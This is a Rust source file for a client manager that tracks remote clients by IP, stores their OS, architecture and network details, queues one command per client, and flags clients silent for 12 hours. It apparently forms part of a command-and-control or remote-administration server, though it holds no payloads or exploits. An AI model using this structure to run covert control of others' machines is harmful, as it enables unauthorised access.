use serde::{Serialize, Deserialize};
use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::time::Instant;

#[derive(Serialize, Deserialize, Debug)]
pub struct ClientConfig {
    pub arch: String,
    pub network_info: Vec<(String, String)>,
    pub os: String,
}

#[derive(Debug)]
pub struct ClientDetails {
    pub config: ClientConfig,
    pub command: Option<String>,
    pub last_heartbeat: Instant,
}

pub type ClientMap = Arc<Mutex<HashMap<String, ClientDetails>>>;

#[derive(Clone)]
pub struct ClientManager {
    clients: ClientMap,
}

impl ClientManager {
    pub fn new() -> Self {
        ClientManager {
            clients: Arc::new(Mutex::new(HashMap::<String, ClientDetails>::new()))
        }
    }

    pub fn add_client(&self, ip: String, details: ClientDetails){
        let mut clients = self.clients.lock().unwrap();
        clients.insert(ip, details);
    }

    pub fn remove_client(&self, ip: &String) {
        let mut clients = self.clients.lock().unwrap();
        clients.remove(ip);
    }

    pub fn list_clients(&self) -> Vec<String> {
        let clients = self.clients.lock().unwrap();
        clients.keys().cloned().collect()
    }

    pub fn get_command(&self, ip: &String) -> Option<String> {
        let clients = self.clients.lock().unwrap();
        clients.get(ip).and_then(|client_details| client_details.command.clone())
    }


    pub fn update_command(&self, ip: &String, cmd: String) -> Option<String>{
        let mut clients = self.clients.lock().unwrap();
        let cmd: Option<String> = Some(cmd);
        if let Some(client_details) = clients.get_mut(ip) {
            client_details.command = cmd.clone();
            cmd
        } else {
            None
        }
    }

    pub fn reset_command(&self, ip: &String) -> Result<(), String> {
        let mut clients = self.clients.lock().unwrap();
        if let Some(client_details) = clients.get_mut(ip) {
            client_details.command = None;
            Ok(())
        } else {
            Err(format!("Client with IP {} not found", ip))
        }
    }

    pub fn client_exists(&self, ip: &String) -> bool {
        let clients = self.clients.lock().unwrap();
        clients.contains_key(ip)
    }

    pub fn update_heartbeat(&self, ip: &String) {
        let mut clients = self.clients.lock().unwrap();

        if let Some(details) = clients.get_mut(ip) {
            details.last_heartbeat = Instant::now();
            println!("[I] Updated heartbeat for client {}", ip);
        }

    }

    pub fn check_heartbeats(&self) -> Vec<String> {
        let now = Instant::now();
        let heartbeat_threshold = std::time::Duration::from_secs(12*60*60); // 12h

        let clients = self.clients.lock().unwrap();
        clients.iter()
            .filter_map(|(ip, details)| {
               if now.duration_since(details.last_heartbeat) > heartbeat_threshold {
                    Some(ip.clone())
               } else {
                    None
               }
            })
            .collect()
    }
}

#[derive(Serialize, Deserialize, Debug)]
pub struct ClientCommand {
    name: String,
    pub output: Option<String>,
}

impl ClientCommand {
    pub fn new(name: &String) -> Self {
        ClientCommand {
            name: name.clone(),
            output: None,
        }
    }

    pub fn to_json(&self) -> serde_json::Result<String> {
        serde_json::to_string(&self)
    }
}

